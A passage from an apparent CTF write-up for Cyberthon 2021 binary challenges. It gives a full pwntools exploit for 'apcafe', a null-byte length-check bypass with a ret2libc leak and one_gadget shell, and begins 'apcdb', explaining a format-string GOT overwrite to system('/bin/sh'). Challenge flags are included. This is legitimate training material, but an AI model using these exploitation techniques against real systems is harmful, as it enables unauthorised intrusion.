<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">len</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(msg))</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">f</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">&quot;MSG: </span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">{</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">msg</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h3 id="flag-1" tabindex="-1">Flag! <a class="header-anchor" href="#flag-1" aria-label="Permalink to â€œFlag!â€">â€‹</a></h3><p><code>Cyberthon{mfw_3ncrypt10n_s4m3_45_d3crypt_s4dg3}</code></p><h2 id="apcafe" tabindex="-1">apcafe <a class="header-anchor" href="#apcafe" aria-label="Permalink to â€œapcafeâ€">â€‹</a></h2><div class="language- line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light dracula" style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"><span>We&#39;ve received intel that APOCALYPSE is running a cafe as a front for their illegal activities. </span></span>
<span class="line"><span>Although it seems like a regular cafe on the outside, serving local favourites such as Kopi-O, Milo, </span></span>
<span class="line"><span>and Yuan Yang, we believe that something more sinister is going on. Could u try to find a way to break </span></span>
<span class="line"><span>in so we can investigate further?</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h3 id="reconnaissance-2" tabindex="-1">Reconnaissance <a class="header-anchor" href="#reconnaissance-2" aria-label="Permalink to â€œReconnaissanceâ€">â€‹</a></h3><p>We are greeted by a 64-bit binary that has the following functions: <img src="/assets/Images/Cyberthon-2021/apcafe_main.png" alt=""><img src="/assets/Images/Cyberthon-2021/apcafe_serveorder.png" alt=""></p><p>Of course, not forgetting our checksec... <img src="/assets/Images/Cyberthon-2021/apcafe_checksec.png" alt=""></p><p>Let&#39;s cut to the chase, I&#39;m strapped for time.</p><h3 id="vulnerability-analysis" tabindex="-1">Vulnerability Analysis <a class="header-anchor" href="#vulnerability-analysis" aria-label="Permalink to â€œVulnerability Analysisâ€">â€‹</a></h3><p>One only needs to notice this vulnerability for everything to make sense:</p><ul><li><code>serve_order()</code> stops you from placing more than 10 characters into the buffer...</li><li>But <code>scanf()</code> terminates after null byte (<code>\0</code>), does not stop us from writing more junk to the stack.</li></ul><p>Also:</p><ul><li>We have no <code>win()</code> function, so we should be looking at some way to get us <strong>shell</strong>.</li></ul><p>However <code>NX-bit</code> is turned on, so our first instinct is to look at what <strong>ROP gadgets</strong> we have... <img src="/assets/Images/Cyberthon-2021/apcafe_ropper.png" alt=""></p><p>Rats. No <code>syscall</code> gadget.</p><p>With the information so far, we are most likely looking at a <strong>ret2libc</strong>, where we exploit a <strong>onegadget</strong> to instantly obtain <strong>shell</strong>.</p><p>This should be fairly easy as such a technique was covered in the <code>training challenges</code>...</p><h3 id="the-exploit-1" tabindex="-1">The Exploit <a class="header-anchor" href="#the-exploit-1" aria-label="Permalink to â€œThe Exploitâ€">â€‹</a></h3><p>Instead of painstakingly explaining everything I will simply annotate my code:</p><div class="language-python line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light dracula" style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> pwn </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;"> *</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">remote(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">30101</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># r=process(&quot;./apcafe&quot;,env={&quot;LD_PRELOAD&quot; : &quot;./libc6_2.31-0ubuntu9.2_amd64.so&quot;}) </span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># The above is the correct LIBC version you should obtain from https://libc.blukat.me</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">binary</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">ELF(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">./apcafe</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.recvuntil(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">order?</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># scanf reads without restriction.</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># To circumvent the pesky check in serve_order() just send a null-byte after 10 characters.</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># This is probably a ropchain into shell since there is no win function</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># no syscall... means leak LIBC address from remote.</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.sendline(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">b</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">A</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">10</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">b</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\0</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">8</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">p64(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">4015a3</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">p64(binary.got[</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">puts</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">])</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">p64(binary.symbols[</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">puts</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">])</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">p64(binary.symbols[</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">main</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">]))</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># The stack pointer is at offset 18. Verify it yourself on GDB!</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.recvuntil(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">...</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.recvline()</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">puts_libc</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">u64(r.recvline()[</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">7</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">:</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">].ljust(</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">8</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">b</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\x00</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)) </span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># Leak the address of the puts() function in the GOT table.</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># The GOT table address is used since it is a link to the LIBC address.</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">f</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">&quot;PUTS: </span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">{</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">hex</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(puts_libc)</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.recvuntil(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">order?</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.sendline(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">b</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">A</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">10</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">b</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\0</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">8</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">p64(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">4015a3</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">p64(binary.got[</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">exit</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">])</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">p64(binary.symbols[</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">puts</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">])</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">p64(binary.symbols[</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">main</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">]))</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.recvuntil(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">...</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.recvline()</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">exit_libc</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">u64(r.recvline()[</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">7</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">:</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">].ljust(</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">8</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">b</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\x00</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">))</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">f</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">&quot;EXIT: </span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">{</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">hex</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(exit_libc)</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># Same thing as above.</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># It turns out there are 3 possible libc versions...</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># TRY THEM ALL!!!!</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># 9.0 is already there, failed.</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># 9.2: db/local-a1ca4cd2d1df2fcd2c0f582665051c261d84c1d6.symbols</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">libc_base</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">puts_libc</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">875a0</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> </span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># Offset of puts() function in GOT table.</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># Obtained from libc-database, you should check it out.</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">one_gadget</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">libc_base</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">e6c84</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># Obtained from one-gadget. Check that out too.</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.sendline(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">b</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">A</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">10</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">b</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\0</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">8</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">p64(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">4015a1</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">p64(</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">p64(</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">p64(one_gadget))</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.interactive()</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br></div></div><p>After getting <strong>shell</strong> we thus obtain:</p><h3 id="flag-2" tabindex="-1">Flag! <a class="header-anchor" href="#flag-2" aria-label="Permalink to â€œFlag!â€">â€‹</a></h3><p><code>Cyberthon{th4t5_4_r34lly_l000ng_0rd3r_dud3_pl5_ch1ll}</code></p><h2 id="apcdb" tabindex="-1">apcdb <a class="header-anchor" href="#apcdb" aria-label="Permalink to â€œapcdbâ€">â€‹</a></h2><div class="language- line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light dracula" style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"><span>We&#39;ve found a network service that seems to be posing as a fake directory of APOCALYPSE members. </span></span>
<span class="line"><span>Although it doesn&#39;t seem to be hooked up to any actual database, it does look a tad vulnerable. </span></span>
<span class="line"><span>Could u try to break in anyway? Who knows, access to this server might come in useful.</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>Being the only person to have solved this during the actual CTF, of course I must do a writeup on it uwu.</p><h3 id="reconnaissance-3" tabindex="-1">Reconnaissance <a class="header-anchor" href="#reconnaissance-3" aria-label="Permalink to â€œReconnaissanceâ€">â€‹</a></h3><p>We are once again presented with a 64-bit binary with the following function: <img src="/assets/Images/Cyberthon-2021/apcdb_main.png" alt=""></p><p>Of course, not forgetting our checksec... <img src="/assets/Images/Cyberthon-2021/apcdb_checksec.png" alt=""></p><h3 id="vulnerability-analysis-1" tabindex="-1">Vulnerability Analysis <a class="header-anchor" href="#vulnerability-analysis-1" aria-label="Permalink to â€œVulnerability Analysisâ€">â€‹</a></h3><p>&quot;This is <strong>real</strong> similar to that <code>apcafe</code> challenge&quot;, you say.</p><p>And you&#39;d be right.</p><p>In fact there are only two key differences:</p><ul><li>Lack of format string in <code>printf()</code> is a telltale sign of <strong>Format String Exploit</strong>. <ul><li>We can use this to once again <strong>leak LIBC version</strong></li></ul></li><li>You can only leak <strong>one</strong> address.</li></ul><h3 id="leaking-libc" tabindex="-1">Leaking LIBC <a class="header-anchor" href="#leaking-libc" aria-label="Permalink to â€œLeaking LIBCâ€">â€‹</a></h3><p>Ideally when <strong>leaking LIBC</strong>, we want multiple addresses in a <strong>single</strong> connection.</p><p>This is because <strong>LIBC</strong> files are <strong>PIE</strong> meaning that their addresses are merely offsets added to a <strong>random</strong> <code>base address</code>.</p><p>If you instead retrieve addresses from <strong>multiple</strong> connections, the <strong>PIE bases</strong> are most definitely different, and you (probably) cannot use that to retrieve <strong>LIBC version</strong> from <a href="https://libc.blukat.me" target="_blank" rel="noreferrer">libc.blukat.me</a></p><p>We can overcome this simply by overwriting the <a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html" target="_blank" rel="noreferrer">GOT entry</a> of the <code>exit()</code> function, since <strong>partial RELRO</strong> security allows us to overwrite <code>.got.plt</code>.</p><p>This will in effect give us a never-ending loop, which is great because now we can do whatever we want &gt;:))).</p><p>For example, leaking our <strong>LIBC addresses</strong> as usual!</p><h3 id="the-exploit-2" tabindex="-1">The Exploit <a class="header-anchor" href="#the-exploit-2" aria-label="Permalink to â€œThe Exploitâ€">â€‹</a></h3><p>After we leak some nice addresses we will shove them into <a href="https://libc.blukat.me" target="_blank" rel="noreferrer">libc.blukat.me</a> to get our dearest libc version:</p><p><img src="/assets/Images/Cyberthon-2021/apcdb_libc.png" alt=""></p><p>(During the actual competition I forgot to change my connection to the <code>remote</code> server, which resulted in some very fun times as I tried to figure out why my offsets were pointing me to a wrong <strong>LIBC address</strong>. Be careful kids!)</p><p>And after that, as you can see on the right, it is absolutely trivial to get shell.</p><p>We just need to overwrite the <a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html" target="_blank" rel="noreferrer">GOT entry</a> of <code>printf()</code> to our <code>system()</code> offset, after which we pass <code>&quot;/bin/sh\x00&quot;</code> in to call our shell program!</p><p>(Sidenote: I tried using <code>str_bin_sh</code>, but I got an absolutely dysfunctional shell which I spent debugging until the scoreboard was frozen :PPP)</p><p>Here&#39;s the code used to carry out the exploit:</p><div class="language-python line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light dracula" style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> pwn </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;"> *</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">remote(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">30201</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># We leak the LIBC addresses as described here:</span></span>
